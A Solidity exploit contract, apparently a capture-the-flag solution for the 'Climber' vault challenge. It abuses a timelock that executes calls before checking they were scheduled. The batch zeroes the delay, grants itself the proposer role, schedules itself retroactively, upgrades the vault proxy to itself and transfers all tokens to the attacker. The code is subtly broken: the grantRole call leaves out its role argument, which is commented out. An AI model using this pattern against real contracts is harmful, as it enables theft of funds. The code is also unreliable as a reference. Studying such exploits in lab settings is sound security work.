// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../climber/ClimberVault.sol";
import "../climber/ClimberTimelock.sol";
import "../climber/ClimberConstants.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ClimberHack is UUPSUpgradeable {
    ClimberTimelock immutable timelock;
    address immutable vaultProxyAddress;
    IERC20 immutable token;
    address immutable attacker;

    constructor(
        ClimberTimelock _timelock,
        address _vaultProxyAddress,
        IERC20 _token
    ) {
        timelock = _timelock;
        vaultProxyAddress = _vaultProxyAddress;
        token = _token;
        attacker = msg.sender;
    }

    function buildProposal()
        internal
        returns (address[] memory, uint256[] memory, bytes[] memory)
    {
        address[] memory targets = new address[](5);
        uint256[] memory values = new uint256[](5);
        bytes[] memory dataElements = new bytes[](5);

        // Update delay to 0.
        targets[0] = address(timelock);
        values[0] = 0;
        dataElements[0] = abi.encodeWithSelector(
            ClimberTimelock.updateDelay.selector,
            0
        );

        // Grant contract proposer role.
        targets[1] = address(timelock);
        values[1] = 0;
        dataElements[1] = abi.encodeWithSelector(
            AccessControl.grantRole.selector,
            // timelock.PROPOSER_ROLE(),
            address(this)
        );

        // Schedule the proposal.
        targets[2] = address(this);
        values[2] = 0;
        dataElements[2] = abi.encodeWithSelector(
            ClimberHack.scheduleProposal.selector
        );

        // Upgrade Proxy to use this contract
        targets[3] = address(vaultProxyAddress);
        values[3] = 0;
        dataElements[3] = abi.encodeWithSelector(
            UUPSUpgradeable.upgradeTo.selector,
            address(this)
        );

        // Sweep to steal funds
        targets[4] = address(vaultProxyAddress);
        values[4] = 0;
        dataElements[4] = abi.encodeWithSelector(
            ClimberHack.sweepFunds.selector
        );

        return (targets, values, dataElements);
    }

    // Exploit Start here, sending all proposals above
    function executeProposal() external {
        (
            address[] memory targets,
            uint256[] memory values,
            bytes[] memory dataElements
        ) = buildProposal();
        timelock.execute(targets, values, dataElements, 0);
    }

    // As proposer, the contract can now make it legit
    function scheduleProposal() external {
        (
            address[] memory targets,
            uint256[] memory values,
            bytes[] memory dataElements
        ) = buildProposal();
        timelock.schedule(targets, values, dataElements, 0);
    }

    // As new Vault Proxy's Logic Contract, this can move all funds to attacker
    function sweepFunds() external {
        token.transfer(attacker, token.balanceOf(address(this)));
    }

    // Required function for UUPSUpgradeable.
    function _authorizeUpgrade(address newImplementation) internal override {}
}
